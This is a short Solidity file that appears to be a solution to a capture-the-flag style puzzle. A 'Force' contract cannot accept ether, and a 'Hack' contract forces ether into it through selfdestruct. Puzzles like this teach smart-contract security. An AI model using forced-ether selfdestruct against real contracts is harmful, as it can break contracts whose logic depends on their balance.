// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Hack {
    receive() external payable {}
    function kill(address payable _force) public {
        selfdestruct(_force);
    }
}